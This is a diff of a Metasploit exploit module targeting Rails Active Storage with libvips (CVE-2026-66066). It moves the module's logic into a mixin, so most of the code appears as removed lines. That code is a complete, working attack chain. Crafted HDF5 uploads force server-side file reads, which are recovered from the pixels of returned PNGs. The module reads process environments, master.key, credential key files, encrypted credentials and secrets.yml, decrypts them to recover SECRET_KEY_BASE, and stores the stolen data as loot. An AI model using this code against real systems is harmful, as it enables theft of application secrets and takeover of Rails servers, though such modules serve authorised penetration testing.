+++ modules/exploits/multi/http/rails_activestorage_vips_rce.rb
@@ -5,221 +5,11 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'base64'
-require 'digest/md5'
-require 'json'
-require 'openssl'
-require 'uri'
-require 'yaml'
-require 'zlib'
-
 class MetasploitModule < Msf::Exploit::Remote
   Rank = NormalRanking
 
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::RailsActiveStorageVips
   prepend Msf::Exploit::Remote::AutoCheck
-
-  EXPLOIT_DATA_DIR = ['exploits', 'CVE-2026-66066'].freeze
-  EXTERNAL_PATH_PLACEHOLDER = '/rails_vips_external_path_placeholder_012345678901234567890123456789'.b.freeze
-  EXTERNAL_OFFSET_MARKER = 0x4d53460000000000
-  READ_LAYOUTS = [256, 100, 64, 32, 20, 16].map do |dimension|
-    data_columns = (dimension - 1) / 2
-    {
-      artifact: "ascii_#{dimension}.mat",
-      dimension: dimension,
-      data_columns: data_columns,
-      capacity: data_columns * dimension
-    }.freeze
-  end.freeze
-  KEY_GENERATOR_DIGESTS = %w[sha256 sha1 sha384 sha512].freeze
-  VERIFIER_DIGESTS = {
-    40 => 'sha1',
-    64 => 'sha256',
-    96 => 'sha384',
-    128 => 'sha512'
-  }.freeze
-  ENVIRONMENT_PATHS = ['/proc/self/environ', '/proc/1/environ'].freeze
-  LOCAL_SECRET_PATHS = [
-    '/proc/self/cwd/tmp/local_secret.txt',
-    '/proc/self/cwd/tmp/development_secret.txt'
-  ].freeze
-  CREDENTIAL_ENVIRONMENTS = %w[production staging development test].freeze
-  DEFAULT_ENVIRONMENT_MAX_BYTES = 65_536
-  DEFAULT_CREDENTIALS_MAX_BYTES = 262_144
-  DEFAULT_MAX_READ_REQUESTS = 4096
-  REPRESENTATION_REDIRECT_LIMIT = 3
-  MAX_UPLOAD_HEADERS = 64
-  MAX_UPLOAD_HEADER_BYTES = 65_536
-  MAX_UPLOAD_HEADER_VALUE_BYTES = 8192
-  MAX_YAML_DEPTH = 100
-  UNSAFE_UPLOAD_HEADERS = %w[
-    authorization connection content-length cookie expect host keep-alive proxy-authenticate
-    proxy-authorization proxy-connection te trailer transfer-encoding upgrade
-  ].freeze
-
-  class FlowError < StandardError; end
-  class ConfigError < StandardError; end
-  class DataError < StandardError; end
-  class ReadBudgetError < ConfigError; end
-  class TriggerError < StandardError; end
-  class UnreachableError < StandardError; end
-
-  # Minimal PNG decoder for the grayscale representation responses.
-  # Chunk and filtering rules: https://www.w3.org/TR/png-3/
-  class PngDecoder
-    PNG_SIGNATURE = "\x89PNG\r\n\x1a\n".b
-    MAX_PIXELS = 1_048_576
-    MAX_DATA_BYTES = 4_194_304
-    MAX_CHUNKS = 1024
-    MAX_IDAT_BYTES = 3_145_728
-
-    def self.decode(data)
-      raise TriggerError, 'Representation body is not a PNG image' unless data.is_a?(String) && data.start_with?(PNG_SIGNATURE)
-      raise TriggerError, 'Representation PNG exceeded the maximum encoded size' if data.bytesize > MAX_DATA_BYTES
-
-      offset = PNG_SIGNATURE.bytesize
-      idat = String.new.b
-      chunk_count = 0
-      width = nil
-      height = nil
-      bit_depth = nil
-      color_type = nil
-      compression = nil
-      filter_method = nil
-      interlace = nil
-      saw_iend = false
-
-      while offset + 12 <= data.bytesize
-        chunk_count += 1
-        raise TriggerError, 'Representation PNG contained too many chunks' if chunk_count > MAX_CHUNKS
-
-        length = data.byteslice(offset, 4).unpack1('N')
-        raise TriggerError, 'Representation PNG contains an oversized chunk' if length > data.bytesize - offset - 12
-
-        chunk_type = data.byteslice(offset + 4, 4)
-        chunk_data = data.byteslice(offset + 8, length)
-        chunk_crc = data.byteslice(offset + 8 + length, 4).unpack1('N')
-        expected_crc = Zlib.crc32(chunk_type + chunk_data)
-        raise TriggerError, "Representation PNG #{chunk_type.inspect} chunk failed its CRC check" unless chunk_crc == expected_crc
-
-        case chunk_type
-        when 'IHDR'
-          raise TriggerError, 'Representation PNG contained an invalid IHDR chunk' unless length == 13 && width.nil?
-
-          width, height, bit_depth, color_type, compression, filter_method, interlace = chunk_data.unpack('NNC5')
-        when 'IDAT'
-          raise TriggerError, 'Representation PNG image data exceeded the compressed size limit' if idat.bytesize + length > MAX_IDAT_BYTES
-
-          idat << chunk_data
-        when 'IEND'
-          saw_iend = true
-          break
-        end
-
-        offset += 12 + length
-      end
-
-      raise TriggerError, 'Representation PNG is missing IHDR data' unless width && height
-      raise TriggerError, 'Representation PNG dimensions were invalid' unless width.positive? && height.positive? && width * height <= MAX_PIXELS
-      raise TriggerError, "Unsupported PNG bit depth #{bit_depth}" unless bit_depth == 8
-      raise TriggerError, "Unsupported PNG color type #{color_type}" unless color_type == 0
-      raise TriggerError, "Unsupported PNG compression method #{compression}" unless compression.zero?
-      raise TriggerError, "Unsupported PNG filter method #{filter_method}" unless filter_method.zero?
-      raise TriggerError, 'Interlaced PNG responses are not supported' unless interlace.zero?
-      raise TriggerError, 'Representation PNG is missing image data' if idat.empty?
-      raise TriggerError, 'Representation PNG is missing IEND data' unless saw_iend
-
-      stride = width
-      expected_size = height * (stride + 1)
-      raw = inflate_limited(idat, expected_size)
-      raise TriggerError, 'Representation PNG scanline data had an unexpected length' unless raw.bytesize == expected_size
-
-      previous = Array.new(stride, 0)
-      pixels = String.new.b
-      cursor = 0
-      height.times do
-        filter = raw.getbyte(cursor)
-        cursor += 1
-        row = raw.byteslice(cursor, stride).bytes
-        cursor += stride
-        decoded = unfilter(filter, row, previous)
-        pixels << decoded.pack('C*')
-        previous = decoded
-      end
-
-      { width: width, height: height, channels: 1, pixels: pixels }
-    rescue Zlib::Error => e
-      raise TriggerError, "Representation PNG decompression failed: #{e.message}"
-    end
-
-    def self.inflate_limited(compressed, expected_size)
-      inflater = Zlib::Inflate.new
-      inflated = String.new(capacity: expected_size).b
-      limit = expected_size + 1
-      inflater.inflate(compressed) do |chunk|
-        remaining = limit - inflated.bytesize
-        if chunk.bytesize > remaining
-          raise TriggerError, 'Representation PNG scanline data exceeded the expected length'
-        end
-
-        inflated << chunk
-      end
-      raise TriggerError, 'Representation PNG zlib stream was truncated' unless inflater.finished?
-      raise TriggerError, 'Representation PNG zlib stream contained trailing data' unless inflater.total_in == compressed.bytesize
-
-      inflated
-    ensure
-      inflater&.close unless inflater&.closed?
-    end
-
-    def self.unfilter(filter, row, previous)
-      case filter
-      when 0
-        row
-      when 1
-        decoded = []
-        row.each_index do |index|
-          left = index.zero? ? 0 : decoded[index - 1]
-          decoded << ((row[index] + left) & 0xff)
-        end
-        decoded
-      when 2
-        row.each_index.map { |index| (row[index] + previous[index]) & 0xff }
-      when 3
-        decoded = []
-        row.each_index do |index|
-          left = index.zero? ? 0 : decoded[index - 1]
-          decoded << ((row[index] + ((left + previous[index]) / 2)) & 0xff)
-        end
-        decoded
-      when 4
-        decoded = []
-        row.each_index do |index|
-          left = index.zero? ? 0 : decoded[index - 1]
-          upper = previous[index]
-          upper_left = index.zero? ? 0 : previous[index - 1]
-          decoded << ((row[index] + paeth(left, upper, upper_left)) & 0xff)
-        end
-        decoded
-      else
-        raise TriggerError, "Unsupported PNG scanline filter #{filter}"
-      end
-    end
-
-    def self.paeth(left, upper, upper_left)
-      estimate = left + upper - upper_left
-      left_distance = (estimate - left).abs
-      upper_distance = (estimate - upper).abs
-      upper_left_distance = (estimate - upper_left).abs
-
-      return left if left_distance <= upper_distance && left_distance <= upper_left_distance
-      return upper if upper_distance <= upper_left_distance
-
-      upper_left
-    end
-
-    private_class_method :inflate_limited, :unfilter, :paeth
-  end
 
   def initialize(info = {})
     super(
@@ -423,1370 +213,4 @@ class MetasploitModule < Msf::Exploit::Remote
     fail_with(Failure::UnexpectedReply, e.message)
   end
 
-  def report_vuln(opts = {})
-    service = opts[:service] || @active_storage_service || report_active_storage_service
-    opts = opts.merge(service: service) if service
-    result = super(opts)
-    @vulnerability_reported = true if result
-    result
-  end
-
-  def service_details
-    super.merge(service_name: 'rails')
-  end
-
-  private
-
-  def report_active_storage_service
-    return @active_storage_service if @active_storage_service
-
-    common = { host: rhost, port: rport, proto: 'tcp' }
-    tcp_service = common.merge(name: 'tcp', parents: nil)
-    web_service = if ssl
-                    common.merge(
-                      name: 'https',
-                      parents: common.merge(name: 'ssl', parents: tcp_service)
-                    )
-                  else
-                    common.merge(name: 'http', parents: tcp_service)
-                  end
-
-    @active_storage_service = report_service(
-      common.merge(
-        name: 'rails',
-        info: 'Ruby on Rails Active Storage',
-        resource: { uri: normalize_uri(target_uri.path) },
-        parents: web_service
-      )
-    )
-  end
-
-  def validate_options!
-    raise ConfigError, 'REPRESENTATION_INDEX must be non-negative' if datastore['REPRESENTATION_INDEX'].negative?
-    raise ConfigError, 'EnvironmentMaxBytes must be at least 1024' if datastore['EnvironmentMaxBytes'] < 1024
-    raise ConfigError, 'CredentialsMaxBytes must be at least 1024' if datastore['CredentialsMaxBytes'] < 1024
-    raise ConfigError, 'MaxReadRequests must be positive' unless datastore['MaxReadRequests'].positive?
-
-    external_storage_origins
-  end
-
-  def app_uri(path)
-    normalize_uri(target_uri.path, path)
-  end
-
-  def reset_read_budget!
-    @read_request_count = 0
-  end
-
-  def reserve_read_request!
-    @read_request_count ||= 0
-    if @read_request_count >= datastore['MaxReadRequests']
-      raise ReadBudgetError, "MaxReadRequests (#{datastore['MaxReadRequests']}) was exhausted; increase it only after assessing the target storage and request impact"
-    end
-
-    @read_request_count += 1
-  end
-
-  def patch_hdf5_template(layout, external_path, external_offset = 0)
-    raise FlowError, 'External read path must be absolute' unless external_path.to_s.start_with?('/')
-    raise FlowError, 'External read path contained a NUL byte' if external_path.to_s.include?("\x00")
-    raise FlowError, 'External read path was too long' if external_path.to_s.b.bytesize > EXTERNAL_PATH_PLACEHOLDER.bytesize
-    raise FlowError, 'External read offset must be non-negative' if external_offset.negative?
-    raise FlowError, 'External read offset was too large' if external_offset + layout[:capacity] > 0x7fffffffffffffff
-
-    paths = [Msf::Config.data_directory, Msf::Config.user_data_directory].map do |directory|
-      ::File.join(directory, *EXPLOIT_DATA_DIR, layout[:artifact])
-    end
-    path = paths.find { |candidate| ::File.file?(candidate) }
-    raise DataError, "Missing exploit data file: #{paths.join(' or ')}" unless path
-
-    # HDF5 external-file records are described in the HDF5 format specification:
-    # https://support.hdfgroup.org/documentation/hdf5/latest/_f_m_t3.html
-    data = ::File.binread(path)
-    unless data.scan(EXTERNAL_PATH_PLACEHOLDER).length == layout[:data_columns]
-      raise DataError, "Exploit data file #{layout[:artifact]} had an unexpected external path layout"
-    end
-
-    replacement = external_path.to_s.b.ljust(EXTERNAL_PATH_PLACEHOLDER.bytesize, "\x00")
-    data = data.gsub(EXTERNAL_PATH_PLACEHOLDER) { replacement }
-
-    layout[:data_columns].times do |index|
-      marker_record = [EXTERNAL_OFFSET_MARKER + index, layout[:dimension]].pack('Q<Q<')
-      position = data.index(marker_record)
-      unless position && data.index(marker_record, position + 1).nil?
-        raise DataError, "Exploit data file #{layout[:artifact]} did not contain marker #{index} exactly once"
-      end
-
-      data[position, 8] = [external_offset + (index * layout[:dimension])].pack('Q<')
-    end
-
-    data
-  end
-
-  def detect_read_context
-    candidates = READ_LAYOUTS.dup
-    errors = []
-
-    until candidates.empty?
-      layout = candidates.shift
-      begin
-        read = file_read_once(layout, '/proc/version', 0, "probe_#{layout[:dimension]}.png")
-        if read[:width] != layout[:dimension] || read[:height] != layout[:dimension]
-          observed_limit = [read[:width], read[:height]].min
-          candidates.select! { |candidate| candidate[:dimension] <= observed_limit } if observed_limit.positive?
-          errors << "#{layout[:dimension]}x#{layout[:dimension]} returned #{read[:width]}x#{read[:height]}"
-          next
-        end
-
-        %i[raw sharpened].each do |mode|
-          pixels = restore_ascii_pixels(read, layout, mode)
-          if pixels.include?('Linux version ')
-            print_good("Selected the #{layout[:dimension]}x#{layout[:dimension]} #{mode} text-read layout (#{layout[:capacity]} bytes per request)")
-            return { layout: layout, mode: mode, representation: read }
-          end
-        rescue TriggerError => e
-          errors << "#{layout[:dimension]}x#{layout[:dimension]} #{mode}: #{e.message}"
-        end
-      rescue FlowError, TriggerError => e
-        errors << "#{layout[:dimension]}x#{layout[:dimension]}: #{e.message}"
-      end
-    end
-
-    raise TriggerError, "Could not recover /proc/version through the selected representation (#{errors.join('; ')})"
-  end
-
-  def file_read_once(layout, external_path, external_offset, filename)
-    reserve_read_request!
-    signed_id = direct_upload(
-      csrf_token: csrf_token,
-      filename: filename,
-      content_type: 'image/png',
-      content: patch_hdf5_template(layout, external_path, external_offset)
-    )
-    representation_path, res = request_crafted_representation(signed_id, filename)
-    raise UnreachableError, 'No response while requesting the crafted representation' unless res
-    raise TriggerError, "Crafted representation returned HTTP #{res.code}" unless res.code == 200
-
-    PngDecoder.decode(res.body.to_s.b).merge(path: representation_path, signed_id: signed_id)
-  end
-
-  def request_crafted_representation(signed_id, filename)
-    if datastore['VARIATION_KEY'].present?
-      return request_variation_key_representation(signed_id, filename)
-    end
-
-    path = substitute_representation_blob(base_representation_path, signed_id, filename)
-    [path, request_representation(path)]
-  end
-
-  def request_variation_key_representation(signed_id, filename)
-    routes = @variation_key_route ? [@variation_key_route] : %i[redirect legacy]
-    statuses = {}
-
-    routes.each do |route|
-      path = standard_representation_path(signed_id, datastore['VARIATION_KEY'], filename, route: route)
-      res = request_representation(path)
-      if res&.code == 200 && res.body.to_s.b.start_with?(PngDecoder::PNG_SIGNATURE)
-        @variation_key_route = route
-        return [path, res]
-      end
-
-      statuses[route] = res&.code
-    end
-
-    if statuses.values.all?(&:nil?)
-      raise UnreachableError, 'No response from either standard Active Storage representation route'
-    end
-
-    details = statuses.map { |route, status| "#{route}: #{status ? "HTTP #{status}" : 'no response'}" }.join(', ')
-    raise TriggerError, "Crafted representation did not return a PNG image through a standard Active Storage route (#{details})"
-  end
-
-  def read_text_file(context, external_path, max_bytes:, filename:, stop_when: nil, allow_partial: false)
-    combined = String.new.b
-    offset = 0
-
-    while offset < max_bytes
-      read = file_read_once(context[:layout], external_path, offset, filename)
-      decoded = if allow_partial && context[:mode] == :sharpened
-                  restore_ascii_pixels_partial(read, context[:layout])
-                else
-                  restore_ascii_pixels(read, context[:layout], context[:mode])
-                end
-      combined << decoded.byteslice(0, max_bytes - combined.bytesize)
-      break if decoded.bytes.all?(&:zero?)
-      break if stop_when&.call(combined)
-
-      offset += context[:layout][:capacity]
-    end
-
-    combined.sub(/\x00+\z/n, '')
-  end
-
-  def try_read_text_file(context, external_path, max_bytes:, filename:, stop_when: nil, allow_partial: false)
-    read_text_file(context, external_path, max_bytes: max_bytes, filename: filename, stop_when: stop_when, allow_partial: allow_partial)
-  rescue FlowError, TriggerError => e
-    vprint_status("Skipping #{external_path}: #{e.message}")
-    nil
-  end
-
-  def restore_ascii_pixels(read, layout, mode)
-    validate_read_pixels!(read, layout)
-    dimension = layout[:dimension]
-    restored = String.new.b
-    (1...(dimension - 1)).step(2) do |x_coordinate|
-      observed = dimension.times.map do |y_coordinate|
-        read[:pixels].getbyte((y_coordinate * dimension) + x_coordinate)
-      end
-      column = mode == :raw ? observed : restore_ascii_column(observed)
-      restored << column.pack('C*')
-    end
-    restored
-  end
-
-  def restore_ascii_pixels_partial(read, layout)
-    validate_read_pixels!(read, layout)
-    dimension = layout[:dimension]
-    restored = String.new.b
-    (1...(dimension - 1)).step(2) do |x_coordinate|
-      observed = dimension.times.map do |y_coordinate|
-        read[:pixels].getbyte((y_coordinate * dimension) + x_coordinate)
-      end
-      column, consistent = restore_ascii_column_partial(observed)
-      restored << column.each_index.map { |index| consistent[index] ? column[index] : 0 }.pack('C*')
-    end
-    restored
-  end
-
-  def validate_read_pixels!(read, layout)
-    dimension = layout[:dimension]
-    unless read[:width] == dimension && read[:height] == dimension
-      raise TriggerError, "Expected a #{dimension}x#{dimension} representation, got #{read[:width]}x#{read[:height]}"
-    end
-    unless read[:pixels].to_s.b.bytesize == dimension * dimension
-      raise TriggerError, 'Representation pixel data had an unexpected length'
-    end
-  end
-
-  def restore_ascii_column(observed)
-    restored = Array.new(observed.length, 0)
-    index = 0
-
-    while index < observed.length
-      if observed[index].zero?
-        index += 1
-        next
-      end
-
-      finish = index
-      finish += 1 while finish < observed.length && !observed[finish].zero?
-      solved = solve_ascii_run(
-        observed[index...finish],
-        touches_top: index.zero?,
-        touches_bottom: finish == observed.length
-      )
-      solved.each_with_index { |value, offset| restored[index + offset] = value.round.clamp(0, 255) }
-      index = finish
-    end
-
-    unless sharpened_column(restored) == observed
-      raise TriggerError, 'Representation pixels did not match the expected Vips sharpening transform'
-    end
-
-    restored
-  end
-
-  def restore_ascii_column_partial(observed)
-    restored = Array.new(observed.length, 0)
-    index = 0
-    while index < observed.length
-      if observed[index].zero?
-        index += 1
-        next
-      end
-
-      finish = index
-      finish += 1 while finish < observed.length && !observed[finish].zero?
-      solved = solve_ascii_run(
-        observed[index...finish],
-        touches_top: index.zero?,
-        touches_bottom: finish == observed.length
-      )
-      solved.each_with_index { |value, offset| restored[index + offset] = value.round.clamp(0, 255) }
-      index = finish
-    end
-
-    rendered = sharpened_column(restored)
-    consistent = restored.each_index.map do |position|
-      expected_ascii_byte?(restored[position]) && ([position - 1, 0].max..[position + 1, restored.length - 1].min).all? do |neighbor|
-        rendered[neighbor] == observed[neighbor]
-      end
-    end
-    [restored, consistent]
-  end
-
-  def expected_ascii_byte?(value)
-    value.zero? || [9, 10, 13].include?(value) || value.between?(32, 126)
-  end
-
-  def solve_ascii_run(values, touches_top:, touches_bottom:)
-    raise TriggerError, 'Cannot solve an empty text run' if values.empty?
-
-    size = values.length
-    lower = Array.new(size, -1.0)
-    diagonal = Array.new(size, 32.0)
-    upper = Array.new(size, -1.0)
-    right_hand_side = values.map { |value| 24.0 * value }
-    lower[0] = 0.0
-    upper[-1] = 0.0
-    diagonal[0] = 31.0 if touches_top
-    diagonal[-1] = 31.0 if touches_bottom
-
-    (1...size).each do |index|
-      raise TriggerError, 'Sharpening equation contained a zero pivot' if diagonal[index - 1].zero?
-
-      factor = lower[index] / diagonal[index - 1]
-      diagonal[index] -= factor * upper[index - 1]
-      right_hand_side[index] -= factor * right_hand_side[index - 1]
-    end
-
-    solved = Array.new(size)
-    solved[-1] = right_hand_side[-1] / diagonal[-1]
-    (size - 2).downto(0) do |index|
-      solved[index] = (right_hand_side[index] - (upper[index] * solved[index + 1])) / diagonal[index]
-    end
-    solved
-  end
-
-  def sharpened_column(source)
-    source.each_index.map do |index|
-      previous = index.zero? ? source[index] : source[index - 1]
-      following = index == source.length - 1 ? source[index] : source[index + 1]
-      (((32 * source[index]) - previous - following) / 24.0).round.clamp(0, 255)
-    end
-  end
-
-  def context_from_known_secret(secret_key_base)
-    print_status('Using operator-supplied SECRET_KEY_BASE')
-    signed_id = direct_upload(
-      csrf_token: csrf_token,
-      filename: 'safe.png',
-      content_type: 'image/png',
-      content: safe_png
-    )
-    token_info = signed_token_info(signed_id)
-    key_generator_digest = key_generator_digest_for(secret_key_base, token_info)
-    {
-      secret_key_base: secret_key_base,
-      signed_id: signed_id,
-      verifier_key: derive_verifier_key(secret_key_base, key_generator_digest),
-      verifier_digest: token_info[:verifier_digest],
-      message_serializer: token_info[:message_serializer],
-      verifier_source: 'a verifier key derived from operator-supplied SECRET_KEY_BASE'
-    }
-  end
-
-  def context_from_recovered_secret(read_context)
-    secret_key_base, source, key_generator_digest, token_info = recover_secret_key_base(read_context)
-    print_good("Recovered SECRET_KEY_BASE from #{source}")
-    {
-      representation_path: read_context[:representation][:path],
-      verifier_key: derive_verifier_key(secret_key_base, key_generator_digest),
-      verifier_digest: token_info[:verifier_digest],
-      message_serializer: token_info[:message_serializer],
-      verifier_source: "a verifier key derived from #{source}"
-    }
-  end
-
-  def verify_known_secret_context(context)
-    transformations = {
-      'resize_to_limit' => [1, 1]
-    }
-    statuses = {}
-    successful_route = %i[redirect legacy].find do |route|
-      context[:representation_route] = route
-      path = forged_representation_path(context, transformations)
-      res = request_representation(path)
-      next true if res&.code == 200 && res.body.to_s.b.start_with?(PngDecoder::PNG_SIGNATURE)
-
-      statuses[route] = res&.code
-      false
-    end
-    return if successful_route
-
-    context.delete(:representation_route)
-    if statuses.values.all?(&:nil?)
-      raise UnreachableError, 'No response from either standard Active Storage representation route'
-    end
-
-    details = statuses.map { |route, status| "#{route}: #{status ? "HTTP #{status}" : 'no response'}" }.join(', ')
-    raise TriggerError, "Signed safe representation did not return a PNG image (#{details})"
-  end
-
-  def forged_representation_path(context, transformations)
-    serialized = variation_payload(transformations, context[:message_serializer])
-    variation = forged_variation(context[:verifier_key], serialized, context[:verifier_digest])
-    if context[:representation_path]
-      substitute_variation_key(context[:representation_path], variation)
-    else
-      standard_representation_path(
-        context[:signed_id],
-        variation,
-        'safe.png',
-        route: context.fetch(:representation_route, :redirect)
-      )
-    end
-  end
-
-  def recover_secret_key_base(context)
-    LOCAL_SECRET_PATHS.each do |path|
-      bytes = try_read_text_file(context, path, max_bytes: 512, filename: 'local_secret.png')
-      next unless bytes
-
-      candidate = validated_secret_candidate(trim_external_bytes(bytes), path, context[:representation][:signed_id])
-      return candidate if candidate
-    end
-
-    environments = []
-    ENVIRONMENT_PATHS.each do |path|
-      print_status("Reading up to #{datastore['EnvironmentMaxBytes']} bytes from #{path}")
-      partial = context[:mode] == :sharpened
-      validated_environment_secret = nil
-      bytes = try_read_text_file(
-        context,
-        path,
-        max_bytes: datastore['EnvironmentMaxBytes'],
-        filename: 'environment.png',
-        stop_when: lambda { |candidate_bytes|
-          environment_contains_usable_key?(candidate_bytes, path, context[:representation][:signed_id]) do |candidate|
-            validated_environment_secret = candidate
-          end
-        },
-        allow_partial: partial
-      )
-      next unless bytes
-
-      environment = parse_environment(bytes)
-      environments << [path, environment]
-      loot_path = store_loot(
-        partial ? 'rails.process.environ.partial' : 'rails.process.environ',
-        'application/octet-stream',
-        rhost,
-        bytes,
-        partial ? "#{::File.basename(path)}.partial.bin" : "#{::File.basename(path)}.bin",
-        partial ? "Partially recovered #{path}; uncertain bytes were replaced with NUL" : "Recovered #{path} bytes",
-        @active_storage_service || report_active_storage_service
-      )
-      print_status("Stored recovered environment bytes in: #{loot_path}")
-
-      return validated_environment_secret if validated_environment_secret
-
-      if environment['SECRET_KEY_BASE'].present?
-        candidate = validated_secret_candidate(environment['SECRET_KEY_BASE'], path, context[:representation][:signed_id])
-        return candidate if candidate
-      end
-    end
-
-    master_keys = environments.filter_map do |path, environment|
-      key = environment['RAILS_MASTER_KEY'].to_s.strip
-      [key, "RAILS_MASTER_KEY from #{path}"] if valid_master_key?(key)
-    end
-
-    credential_environments = environments.flat_map do |_path, environment|
-      [environment['RAILS_ENV'], environment['RACK_ENV']]
-    end
-    credential_environments = credential_environments.compact.select { |value| value.match?(/\A[a-zA-Z0-9_-]+\z/) }
-    credential_environments = (credential_environments + CREDENTIAL_ENVIRONMENTS).uniq
-
-    credential_environments.each do |environment|
-      key_path = "/proc/self/cwd/config/credentials/#{environment}.key"
-      bytes = try_read_text_file(context, key_path, max_bytes: 128, filename: "#{environment}_key.png")
-      next unless bytes
-
-      key = trim_external_bytes(bytes)
-      master_keys << [key, key_path] if valid_master_key?(key)
-    end
-
-    master_key_path = '/proc/self/cwd/config/master.key'
-    bytes = try_read_text_file(context, master_key_path, max_bytes: 128, filename: 'master_key.png')
-    if bytes
-      key = trim_external_bytes(bytes)
-      master_keys << [key, master_key_path] if valid_master_key?(key)
-    end
-    master_keys.uniq!(&:first)
-
-    credentials_paths = credential_environments.map do |environment|
-      "/proc/self/cwd/config/credentials/#{environment}.yml.enc"
-    end
-    credentials_paths << '/proc/self/cwd/config/credentials.yml.enc'
-
-    credentials_paths.uniq.each do |path|
-      encrypted = try_read_text_file(
-        context,
-        path,
-        max_bytes: datastore['CredentialsMaxBytes'],
-        filename: 'credentials.png'
-      )
-      next unless encrypted
-
-      encrypted = trim_external_bytes(encrypted)
-      master_keys.each do |master_key, key_source|
-        plaintext = decrypt_rails_credentials(encrypted, master_key)
-        next unless plaintext
-
-        secret = extract_secret_key_base_from_plaintext(plaintext)
-        next unless secret
-
-        candidate = validated_secret_candidate(secret, "#{path} using #{key_source}", context[:representation][:signed_id])
-        return candidate if candidate
-      end
-    end
-
-    legacy_secret = recover_legacy_secrets(context, credential_environments, master_keys)
-    return legacy_secret if legacy_secret
-
-    keys = environments.flat_map { |_path, environment| environment.keys }.uniq.sort
-    raise TriggerError, "Could not recover SECRET_KEY_BASE from Rails local secrets, environment, encrypted credentials, or legacy secrets.yml (environment keys: #{keys.join(', ')})"
-  end
-
-  # Rails 6.0-7.1 fall back to Rails.application.secrets.secret_key_base, read from
-  # the plaintext config/secrets.yml or the encrypted config/secrets.yml.enc. The
-  # encrypted file uses ActiveSupport::MessageEncryptor with the same aes-128-gcm
-  # envelope as credentials, but serializes the YAML through Marshal and is keyed by
-  # config/secrets.yml.key or RAILS_MASTER_KEY. Both files are environment-keyed.
-  def recover_legacy_secrets(context, environments, master_keys)
-    plaintext_path = '/proc/self/cwd/config/secrets.yml'
-    bytes = try_read_text_file(context, plaintext_path, max_bytes: datastore['CredentialsMaxBytes'], filename: 'secrets.png')
-    if bytes
-      secret_key_base_candidates_from_secrets_yaml(trim_external_bytes(bytes), environments).each do |secret|
-        candidate = validated_secret_candidate(secret, plaintext_path, context[:representation][:signed_id])
-        return candidate if candidate
-      end
-    end
-
-    encrypted_path = '/proc/self/cwd/config/secrets.yml.enc'
-    encrypted = try_read_text_file(context, encrypted_path, max_bytes: datastore['CredentialsMaxBytes'], filename: 'secrets_enc.png')
-    return nil unless encrypted
-
-    encrypted = trim_external_bytes(encrypted)
-    legacy_secrets_keys(context, master_keys).each do |key, key_source|
-      plaintext = decrypt_rails_credentials(encrypted, key)
-      next unless plaintext
-
-      secret_key_base_candidates_from_secrets_yaml(unwrap_marshaled_string(plaintext), environments).each do |secret|
-        candidate = validated_secret_candidate(secret, "#{encrypted_path} using #{key_source}", context[:representation][:signed_id])
-        return candidate if candidate
-      end
-    end
-    nil
-  end
-
-  def legacy_secrets_keys(context, master_keys)
-    keys = master_keys.dup
-    secrets_key_path = '/proc/self/cwd/config/secrets.yml.key'
-    bytes = try_read_text_file(context, secrets_key_path, max_bytes: 128, filename: 'secrets_key.png')
-    if bytes
-      key = trim_external_bytes(bytes)
-      keys << [key, secrets_key_path] if valid_master_key?(key)
-    end
-    keys.uniq(&:first)
-  end
-
-  def secret_key_base_candidates_from_secrets_yaml(yaml, environments)
-    document = safe_load_yaml_document(yaml, aliases: true)
-    return [] unless document.is_a?(Hash)
-
-    shared = document['shared'].is_a?(Hash) ? document['shared'] : {}
-    environments = ['development'] if environments.empty?
-    sections = environments.uniq.map do |environment|
-      environment_secrets = document[environment]
-      environment_secrets = {} unless environment_secrets.is_a?(Hash)
-      shared.merge(environment_secrets)
-    end
-
-    sections << document
-    sections.filter_map do |section|
-      secret = section['secret_key_base']
-      secret if secret.is_a?(String) && secret.present? && !secret.include?('<%')
-    end.uniq
-  end
-
-  def safe_load_yaml_document(yaml, aliases:)
-    return unless yaml.is_a?(String)
-
-    # Psych's safe loader can exhaust the Ruby stack before it constructs a
-    # target-controlled document. Inspect its AST iteratively first so deeply
-    # nested YAML is rejected without recursively walking the node tree.
-    stream = Psych.parse_stream(yaml)
-    pending = stream.children.map { |node| [node, 1] }
-    until pending.empty?
-      node, depth = pending.pop
-      return if depth > MAX_YAML_DEPTH
-
-      Array(node.children).each { |child| pending << [child, depth + 1] }
-    end
-
-    YAML.safe_load(
-      yaml,
-      permitted_classes: [],
-      permitted_symbols: [],
-      aliases: aliases
-    )
-  rescue Psych::Exception, SystemStackError
-    nil
-  end
-
-  def environment_contains_complete_key?(bytes)
-    %w[SECRET_KEY_BASE RAILS_MASTER_KEY].any? do |key|
-      bytes.match?(/(?:\A|\x00)#{Regexp.escape(key)}=[^\x00]*\x00/n)
-    end
-  end
-
-  def environment_contains_usable_key?(bytes, source, signed_id)
-    return false unless environment_contains_complete_key?(bytes)
-
-    environment = parse_environment(bytes)
-    if environment['SECRET_KEY_BASE'].present?
-      candidate = validated_secret_candidate(environment['SECRET_KEY_BASE'], source, signed_id)
-      if candidate
-        yield candidate if block_given?
-        return true
-      end
-    end
-
-    false
-  end
-
-  def parse_environment(bytes)
-    bytes.split("\x00").each_with_object({}) do |entry, environment|
-      next unless entry.include?('=')
-
-      key, value = entry.split('=', 2)
-      environment[key] = value
-    end
-  end
-
-  def trim_external_bytes(bytes)
-    bytes.split("\x00", 2).first.to_s.strip
-  end
-
-  def validated_secret_candidate(secret, source, signed_id)
-    secret = validate_secret_key_base(secret)
-    token_info = signed_token_info(signed_id)
-    key_generator_digest = key_generator_digest_for(secret, token_info)
-    [secret, source, key_generator_digest, token_info]
-  rescue TriggerError => e
-    vprint_status("Skipping #{source} secret candidate: #{e.message}")
-    nil
-  end
-
-  def validate_secret_key_base(secret)
-    raise TriggerError, 'SECRET_KEY_BASE was empty' if secret.blank?
-
-    secret
-  end
-
-  def valid_master_key?(key)
-    key.match?(/\A[0-9a-f]{32}\z/i)
-  end
-
-  def decrypt_rails_credentials(encrypted, master_key)
-    return nil unless valid_master_key?(master_key.to_s.strip)
-
-    parts = encrypted.split('--')
-    return nil unless parts.length == 3
-
-    ciphertext, iv, auth_tag = parts.map { |part| Base64.strict_decode64(part) }
-    return nil unless iv.bytesize == 12 && auth_tag.bytesize == 16
-
-    cipher = OpenSSL::Cipher.new('aes-128-gcm')
-    cipher.decrypt
-    cipher.key = [master_key.to_s.strip].pack('H*')
-    cipher.iv = iv
-    cipher.auth_tag = auth_tag
-    cipher.auth_data = ''
-    cipher.update(ciphertext) + cipher.final
-  rescue OpenSSL::Cipher::CipherError, ArgumentError
-    nil
